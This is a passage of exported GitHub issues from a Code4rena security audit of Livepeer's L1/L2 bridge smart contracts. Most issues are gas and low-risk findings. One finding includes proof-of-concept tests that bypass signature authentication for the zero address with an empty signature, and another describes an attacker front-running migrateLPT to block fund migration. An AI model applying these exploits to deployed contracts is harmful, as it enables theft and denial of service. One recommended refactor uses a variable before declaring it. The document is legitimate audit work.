"https://github.com/code-423n4/2022-01-livepeer-findings/issues/153", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "L2Migrator.claimStake attempts fee transfer without checking its possibility"}, {"title": "Gas: `L2LPTDataCache.sol:l1CirculatingSupply()`, Storage variables should be cached", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `L2LPTDataCache.sol:l1CirculatingSupply()`, the code is as follows: ``` File: L2LPTDataCache.sol 88:     function l1CirculatingSupply() public view returns (uint256) { 89:         // After the first update from L1, l1TotalSupply should always be >= l2SupplyFromL1 90:         // The below check is defensive to avoid reverting if this invariant for some reason violated 91:         return 92:             l1TotalSupply >= l2SupplyFromL1 93:                 ? l1TotalSupply - l2SupplyFromL1 94:                 : 0; 95:     } ```  I suspect that statistically, the arithmetic operation `l1TotalSupply - l2SupplyFromL1` should often be triggered. Therefore, caching the 2 variables `l1TotalSupply` and `l2SupplyFromL1` in memory variables would save the 2 SLOADs (~200 gas) in the substraction and cost 4 MLOADs (~12 gas) and 2 MSTOREs (6 gas).  It can be done this way, as an example: `(uint256 _l1TotalSupply, uint256 _l2SupplyFromL1) = (l1TotalSupply, l2SupplyFromL1);`  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache `l1TotalSupply` and `l2SupplyFromL1` in local variables  "}, {"title": "Gas: `L2LPTDataCache.sol:l1CirculatingSupply()`, strict comparison can avoid expensive operation", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (2 SLOADs and 1 SUB are avoided with the suggested solution)  ## Proof of Concept In `L2LPTDataCache.sol:l1CirculatingSupply()`, the code is as such: ``` File: L2LPTDataCache.sol 88:     function l1CirculatingSupply() public view returns (uint256) { 89:         // After the first update from L1, l1TotalSupply should always be >= l2SupplyFromL1 90:         // The below check is defensive to avoid reverting if this invariant for some reason violated 91:         return 92:             l1TotalSupply >= l2SupplyFromL1 93:                 ? l1TotalSupply - l2SupplyFromL1 94:                 : 0; 95:     }  ```  Here, in the case of `l1TotalSupply == l2SupplyFromL1`, the substraction is equal to 0, but the computation is still done instead of return the already present 0 value. This could be avoided by making a strict comparison: ``` File: L2LPTDataCache.sol 91:         return 92:             l1TotalSupply > l2SupplyFromL1 93:                 ? l1TotalSupply - l2SupplyFromL1 94:                 : 0; ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use `>` instead of `>=`  "}, {"title": "In `L2Migrator.sol:finalizeMigrateDelegator()`, Account `l2Addr`'s existence should be checked before call", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/149", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "In `L2Migrator.sol:finalizeMigrateDelegator()`, Account `l2Addr`'s existence should be checked before call"}, {"title": "Gas: `DelegatorPool.sol:claim()`, a repetitive arithmetic operation should be cached", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/146", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (2 SLOADs and 1 SUB vs 1 MSTORE and 2 MLOADs)  ## Proof of Concept In `DelegatorPool.sol:claim()`, the following calculation is done twice :  ``` (X * _stake) / (initialStake - claimedInitialStake);  where X is either currTotalStake or currTotalFees ```  While I understand a loss of precision could occur by caching the whole calculation, it's possible to save some gas (here, 2 SLOADs and 1 SUB) by caching the result of the denominator's substraction in a variable (`initialStake - claimedInitialStake`) and using this instead of computing the substraction twice.  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto  "}, {"title": "`Manager.sol:setController()` should be a two-step process", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/143", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "`Manager.sol:setController()` should be a two-step process"}, {"title": "Signature authentication bypass for ZERO address", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/142", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  kemmio   # Vulnerability details  ## Impact Vulnerability in requireValidMigration() function gives opportunity to authenticate on behalf of ZERO address (l1addr == ZERO) and migrate locked up bonds, delegators, sender  ## Proof of Concept  L1Migrator contract's functions migrateDelegator(), migrateUnbondingLocks(), migrateSender() use requireValidMigration() to authenticate the migration request, as can be seen in: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L164-L173 https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L214-L228 https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L267-L274  requireValidMigration() checks if l2addr=ZERO and reverts in that's the case: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L506-L509  Next it checks wether msg.sender==l1addr or tries to authenticate with signature otherwise: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L510-L514  It calls recoverSigner() for that purpose which calls ECDS.recover to recover signing address, but before that it checks if signature is empty and returns address(0): https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L522-L524  This functionality can be abused to bypass authentication for ZERO address  Proof of Concept: (add this tests to ./test/unit/L1/l1Migrator.test.ts and run \"yarn test test/unit/L1/l1Migrator.test.ts\" ) ```       it('migrates delegator for l1addr==ZERO auth', async () => {          const sig = '0x';         let tx = l1Migrator             .connect(notL1EOA)             .migrateDelegator('0x0000000000000000000000000000000000000000', l1EOA.address, '0x', 0, 0, 0, {               value: ethers.utils.parseEther('1'),             });         await expect(tx).to.emit(l1Migrator,'MigrateDelegatorInitiated');       });       it('migrates unbonding locks for l1addr==ZERO auth', async () => {          const sig = '0x';         let tx = l1Migrator             .connect(notL1EOA)             .migrateUnbondingLocks(                 '0x0000000000000000000000000000000000000000',                 l1EOA.address,                 [],                 '0x',                 0,                 0,                 0,                 {                   value: ethers.utils.parseEther('1'),                 },             );         await expect(tx).to.emit(l1Migrator,'MigrateUnbondingLocksInitiated');       });       it('migrates sender for l1addr==ZERO auth', async () => {          const sig = '0x';         let tx = l1Migrator             .connect(notL1EOA)             .migrateSender('0x0000000000000000000000000000000000000000', l1EOA.address, '0x', 0, 0, 0, {               value: ethers.utils.parseEther('1'),             });         await expect(tx).to.emit(l1Migrator,'MigrateSenderInitiated');       }); ```  ## Tools Used  ## Recommended Mitigation Steps Remove these lines: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L522-L524  "}, {"title": "Gas: Missing checks for non-zero transfer value calls", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Checking non-zero transfer values can avoid an external call to save gas.      ## Proof of Concept   Instances missing a non-zero check on amount transfered:   ```   contracts\\sNOTE.sol:142:        BALANCER_POOL_TOKEN.safeTransferFrom(msg.sender, address(this), bptAmount); contracts\\sNOTE.sol:150:        NOTE.safeTransferFrom(msg.sender, address(this), noteAmount); contracts\\sNOTE.sol:178:        WETH.safeTransferFrom(msg.sender, address(this), wethAmount); contracts\\sNOTE.sol:251:        BALANCER_POOL_TOKEN.safeTransfer(msg.sender, bptToRedeem); contracts\\TreasuryAction.sol:113:        COMP.safeTransfer(treasuryManagerContract, amountClaimed); contracts\\TreasuryAction.sol:140:        IERC20(underlyingAddress).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying); contracts\\TreasuryManager.sol:108:        IERC20(token).safeTransfer(owner, amount); ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Check if transfer amount > 0.   "}, {"title": "Missing `_from` param comment on `LivepeerToken.sol:burn()`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/140", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The `_from` parameter comment is missing on `LivepeerToken.sol:burn()`. The impact is minimal, but as it's commented elsewhere (https://github.com/livepeer/arbitrum-lpt-bridge/blob/af952a58eff5ff84559e25f62e29f2a3d9e176f9/contracts/L2/gateway/L2LPTGateway.sol#L96), I figured I'd mention it.  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/e89be1431024d976b8c97bbe64ec4bdfeb28ec64/contracts/L2/token/LivepeerToken.sol#L32-L36 ``` File: LivepeerToken.sol 32:     /** 33:      * @dev Burns a specific amount of the sender's tokens 34:      * @param _amount The amount of tokens to be burned 35:      */ 36:     function burn(address _from, uint256 _amount) 37:         external 38:         override 39:         onlyRole(BURNER_ROLE) 40:     { 41:         _burn(_from, _amount); 42:         emit Burn(_from, _amount); 43:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Add the missing comment  "}, {"title": "Group related data into separate structs", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/138", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Group related data into separate structs"}, {"title": "Gas: Control flow optimization in `L2LPTDataCache.sol:decreaseL2SupplyFromL1()`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `L2LPTDataCache.sol:decreaseL2SupplyFromL1()`, the code is as follows:  ``` File: L2LPTDataCache.sol 57:     function decreaseL2SupplyFromL1(uint256 _amount) external onlyL2LPTGateway { 58:         // If there is a mass withdrawal from L2, _amount could exceed l2SupplyFromL1. 59:         // In this case, we just set l2SupplyFromL1 = 0 because there will be no more supply on L2 60:         // that is from L1 and the excess (_amount - l2SupplyFromL1) is inflationary LPT that was 61:         // never from L1 in the first place. 62:         if (_amount > l2SupplyFromL1) {  63:             l2SupplyFromL1 = 0; 64:         } else { 65:             l2SupplyFromL1 -= _amount; 66:         } 67:  68:         // No event because the L2LPTGateway events are sufficient 69:     } ```  However, this can be optimized : - Strict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO) - In this case here, if `_amount == l2SupplyFromL1`, `0` should be returned - Avoiding the else clause would avoid some opcodes (1 SUB,  1 SLOAD, 1 MLOAD)  The code would become:  ```         if (_amount >= l2SupplyFromL1) {             l2SupplyFromL1 = 0;         } else {             l2SupplyFromL1 -= _amount;         } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Use the non-strict greater-than operator in this particular case  "}, {"title": "Avoiding unnecessary repeated account balance read can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/BridgeMinter.sol#L90-L98  ```solidity function withdrawETHToL1Migrator() external onlyL1Migrator returns (uint256) {     uint256 balance = address(this).balance;      // call() should be safe from re-entrancy here because the L1Migrator and l1MigratorAddr are trusted     (bool ok, ) = l1MigratorAddr.call.value(address(this).balance)(\"\");     require(ok, \"BridgeMinter#withdrawETHToL1Migrator: FAIL_CALL\");      return balance; } ```  At L94, `address(this).balance` can be replaced with `balance` to avoid unnecessarily repeated read of account balance state to save some gas.   "}, {"title": "Inline unnecessary internal function can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Inline unnecessary internal function can make the code simpler and save some gas"}, {"title": "`DelegatorPool.sol#claim()` Use inline expression can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/pool/DelegatorPool.sol#L70-L78  ```solidity         // Calculate stake owed to delegator         uint256 currTotalStake = pendingStake();         uint256 owedStake = (currTotalStake * _stake) /             (initialStake - claimedInitialStake);          // Calculate fees owed to delegator         uint256 currTotalFees = pendingFees();         uint256 owedFees = (currTotalFees * _stake) /             (initialStake - claimedInitialStake); ```  The local variable `currTotalStake`, `currTotalFees` is used only once. Making the expression inline can save gas.  Similar issue exists in `L2Migrator.sol#claimStake()`, `L1Migrator.sol#migrateETH()`, `L1Migrator.sol#migrateLPT()`, `L1ArbitrumMessenger.sol#onlyL2Counterpart()`.  ### Recommendation  Change to:  ```solidity         // Calculate stake owed to delegator         uint256 owedStake = (pendingStake() * _stake) /             (initialStake - claimedInitialStake);          // Calculate fees owed to delegator         uint256 owedFees = (pendingFees() * _stake) /             (initialStake - claimedInitialStake); ```   "}, {"title": "Changing bool to uint256 can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/129", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Changing bool to uint256 can save gas"}, {"title": "Check of `!migratedDelegators[delegator]` can be done earlier to save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  WatchPug   # Vulnerability details  When there are multiple checks, adjusting the sequence to allow the tx to fail earlier can save some gas.  Checks using less gas should be executed earlier than those with higher gas costs, to avoid unnecessary storage read, arithmetic operations, etc when it reverts.  For example:  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L255-L275  ```solidity         require(             claimStakeEnabled,             \"L2Migrator#claimStake: CLAIM_STAKE_DISABLED\"         );          IMerkleSnapshot merkleSnapshot = IMerkleSnapshot(merkleSnapshotAddr);          address delegator = msg.sender;         bytes32 leaf = keccak256(             abi.encodePacked(delegator, _delegate, _stake, _fees)         );          require(             merkleSnapshot.verify(keccak256(\"LIP-73\"), _proof, leaf),             \"L2Migrator#claimStake: INVALID_PROOF\"         );          require(             !migratedDelegators[delegator],             \"L2Migrator#claimStake: ALREADY_MIGRATED\"         ); ```  The check of `!migratedDelegators[delegator]` can be done earlier to avoid reading from storage when `migratedDelegators[delegator] == true`.  ## Recommendation  Change to:  ```solidity         require(             claimStakeEnabled,             \"L2Migrator#claimStake: CLAIM_STAKE_DISABLED\"         );          address delegator = msg.sender;         require(             !migratedDelegators[delegator],             \"L2Migrator#claimStake: ALREADY_MIGRATED\"         );          IMerkleSnapshot merkleSnapshot = IMerkleSnapshot(merkleSnapshotAddr);         require(             merkleSnapshot.verify(keccak256(\"LIP-73\"), _proof, leaf),             \"L2Migrator#claimStake: INVALID_PROOF\"         );          bytes32 leaf = keccak256(             abi.encodePacked(delegator, _delegate, _stake, _fees)         ); ```  "}, {"title": "Setting `uint256` variables to `0` is redundant", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Setting `uint256` variables to `0` is redundant"}, {"title": "`BridgeMinter.sol:migrateToNewMinter()`'s `transferOwnership` should be a two-step process", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/122", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "`BridgeMinter.sol:migrateToNewMinter()`'s `transferOwnership` should be a two-step process"}, {"title": "No checks around poll voting mechanism", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/121", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "No checks around poll voting mechanism"}, {"title": "Name reuse", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/119", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Name reuse"}, {"title": "EIP2612 in token problematic", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/118", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "EIP2612 in token problematic"}, {"title": "Custom GOVERNOR_ROLE unnecessary", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The ControlledGateway.sol contract specifies a custom \"GOVERNOR_ROLE\" value that is assigned to the _msgsender when the contract is deployed. There is no need to create a custom role when only one role is used in the contract. This custom \"GOVERNOR_ROLE\" could be replaced with the built-in \"DEFAULT_ADMIN_ROLE\" value, which is the approach in the contract L1/escrow/L1Escrow.sol.  ## Proof of Concept  The custom role is created [on line 13 of ControlledGateway.sol](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L13)  ## Recommended Mitigation Steps  Remove the GOVERNOR_ROLE role in ControlledGateway.sol and use the built-in DEFAULT_ADMIN_ROLE role to save gas  "}, {"title": "Revert string > 32 bytes", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/115", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  Strings are broken into 32 byte chunks for operations. Revert error strings over 32 bytes therefore consume extra gas as [documented publicly](https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#c17b)  ## Proof of Concept  There are multiple examples of this gas optimization opportunity, including but not limited to: - TreasuryAction.sol [line 41](https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/TreasuryAction.sol#L41)  ## Recommended Mitigation Steps  Reducing revert error strings to under 32 bytes decreases deployment time gas and runtime gas when the revert condition is met. Alternatively, the code could be modified to use custom errors, introduced in Solidity 0.8.4: https://blog.soliditylang.org/2021/04/21/custom-errors/  "}, {"title": "`initialize` function can be called by everyone and front-run in `DelegatorPool.sol`", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/112", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "`initialize` function can be called by everyone and front-run in `DelegatorPool.sol`"}, {"title": "Prevent accidentally burning tokens", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/111", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Prevent accidentally burning tokens"}, {"title": "Missing event & timelock for critical only* functions", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/107", "labels": ["bug", "0 (Non-critical)", "resolved"], "target": "2022-01-livepeer-findings", "body": "Missing event & timelock for critical only* functions"}, {"title": "Drop the token parameter from since it can only be the same value", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/103", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Drop the token parameter from since it can only be the same value"}, {"title": "L1Migrator.migrateLPT` can be used to take away protocol's access to LPT tokens in BridgeMinter", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle\r \r Ruhum\r \r \r # Vulnerability details\r \r # Vulnerability details\r \r ## Impact\r Same thing as the ETH issue I reported earlier. I wasn't sure if those are supposed to be a single issue or not. The concept is the same. But, now you lose LPT tokens.\r \r The `L1Migrator.migrateLPT()` function can be called by **anyone**. It pulls all the LPT from the `BridgeMinter` contract and starts the process of moving the funds to L2. First of all, this function is only executable once. The RetryableTicket created with the first call is the only chance of moving the funds to L2.\r \r The attacker can call the function with [parameters](https://developer.offchainlabs.com/docs/l1_l2_messages#parameters) that make the creation of the RetryableTicket on L2 fail. Thus, the LPT sits in the L1Migrator contract with no way of moving it to L2 or anywhere else. Effectively, the funds are lost.\r \r ## Proof of Concept\r The function is only executable once because it uses the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` to specify the amount of LPT to be sent to L2: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L342\r \r After the first call to `migrateLPT()` that function will always return 0 since the `BridgeMinter` won't have any more LPT: https://github.com/livepeer/protocol/blob/streamflow/contracts/token/BridgeMinter.sol#L107\r \r So after the attacker called `migrateLPT()` with insufficient funds to create a RetryableTicket on L2 we have the following state:\r - BridgeMinter has 0 LPT\r - L1Migrator has X amount of LPT that is not accessible. There are no functions to get the LPT out of there.\r - 1 failed RetryTicket\r \r The same thing can also be triggered by a non-malicious caller by simply providing insufficient funds. The whole design of only being able to try once is the issue here.\r \r ## Tools Used\r none\r \r ## Recommended Mitigation Steps\r Instead of using the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` you should use the balance of the `L1Migrator` contract.\r \r It might also make sense to **not** allow anybody to call the function. I don't see the benefit of that.\r \r `EDIT` Actually, the funds aren't lost. The funds are sent to the Escrow contract which can be used to transfer the funds back to the BridgeMinter contract. Thus, you could reset the whole thing to its initial state and call `L1Migrator.migrateLPT()` again. But, a really persistent attacker has the ability to DoS the function by frontrunning any call to it which results in the RetryableTicket failing again. Thus, you'd have to transfer the funds from the Escrow contract to the BrigeMinter again and so on.\r \r So the same scenario I've outlined earlier is still viable. It's just a bit more difficult now since it has a higher cost for the attacker now. Because of that I think it's an medium issue instead of high.\r \r Also, the mitigation steps I've given aren't valid. You can't use the `L1Migrator` contract's balance since it will always be 0 (the funds are sent to the Escrow contract). Thus the best solution would be to just limit the access to the function."}, {"title": "Gas optimization - remove method in DelegatorPool", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/92", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Gas optimization - remove method in DelegatorPool"}, {"title": "Front running in LivepeerToken", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/91", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Front running in LivepeerToken"}, {"title": "Possible frozen gateway", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/87", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Possible frozen gateway"}, {"title": "ERC20 Approval Race Condition", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/85", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "ERC20 Approval Race Condition"}, {"title": "Lack of event", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/83", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Users and dapps are not notified when someting important is changed.  ## Proof of Concept  Functions that are only executable by privileged users (e.g. onlyOwner) and have an impact (e.g. financial, trust) on other users should emit events.  - contracts\\L1\\gateway\\L1LPTGateway.sol : [setCounterpart,setMinter]. - contracts\\L2\\gateway\\L2Migrator.sol : [setL1Migrator,setDelegatorPoolImpl,setClaimStakeEnabled]. - contracts\\L2\\gateway\\L2LPTGateway.sol : [setCounterpart]. - contracts\\L2\\gateway\\L2LPTDataCache.sol : [setL1LPTDataCache,setL2LPTGateway].  ## Tools Used Manual review.  ## Recommended Mitigation Steps Emit event during important changes.  "}, {"title": "Cache array length in for loops can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Cache array length in for loops can save gas"}, {"title": "Gas: Consider making some constants as non-public to save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Gas: Consider making some constants as non-public to save gas"}, {"title": "Gas: Internal functions can be private if the contract is not herited", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   `private` functions are cheaper than `internal` functions.      ## Proof of Concept   Several `internal` functions are in contracts that are never inherited.      Their `internal` keywords are there:      ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1LPTGateway.sol:170:        internal arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:505:    ) internal view { arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:518:        internal arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2LPTGateway.sol:123:        internal arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:307:    ) internal { arbitrum-lpt-bridge\\contracts\\L2\\pool\\DelegatorPool.sol:95:    function transferBond(address _delegator, uint256 _stake) internal { arbitrum-lpt-bridge\\contracts\\L2\\pool\\DelegatorPool.sol:106:    function pendingStake() internal view returns (uint256) { arbitrum-lpt-bridge\\contracts\\L2\\pool\\DelegatorPool.sol:110:    function pendingFees() internal view returns (uint256) { protocol\\contracts\\Manager.sol:48:    function _onlyController() internal view { protocol\\contracts\\Manager.sol:52:    function _onlyControllerOwner() internal view { protocol\\contracts\\Manager.sol:56:    function _whenSystemNotPaused() internal view { protocol\\contracts\\Manager.sol:60:    function _whenSystemPaused() internal view {   ```     Therefore, their visibility should be reduced to `private`.      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Define these functions as `private`.   "}, {"title": "Gas: Use `calldata` instead of `memory` for external functions where the function argument is read-only.", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "Gas: Use `calldata` instead of `memory` for external functions where the function argument is read-only."}, {"title": "double storage call in function decreaseL2SupplyFromL1", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact save in memory can save more gas instead of double storage call  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTDataCache.sol#L57  ## Tools Used Remix  ## Recommended Mitigation Steps add `l2SupplyFromL1` to memory example: ```         uint256 savel2SupplyFromL1 = l2SupplyFromL1;         if (_amount > savel2SupplyFromL1) {             savel2SupplyFromL1 = 0;         } else {             savel2SupplyFromL1 -= _amount;         } ```  "}, {"title": "Protocol uses floating pragmas ", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/47", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In files like L1LPTDataCache.sol,  floating pragmas are used.  Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.  ## Proof of Concept https://swcregistry.io/docs/SWC-103  ## Tools Used Manual code review   ## Recommended Mitigation Steps Lock the pragma version:  delete pragma solidity 0.8.0 in favor of pragma solidity 0.8.0  "}, {"title": "no check that _amount arg is greater than 0 in outboundTransfer() function ", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/44", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "no check that _amount arg is greater than 0 in outboundTransfer() function "}, {"title": "L1Escrow.approve should be called before calling L1LPTGateway.finalizeInboundTransfer", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/40", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "L1Escrow.approve should be called before calling L1LPTGateway.finalizeInboundTransfer"}, {"title": "_token arg should be from a whitelisted group to avoid use of malicious tokens", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/38", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "_token arg should be from a whitelisted group to avoid use of malicious tokens"}, {"title": "using empty String which is already default 0x", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/30", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor 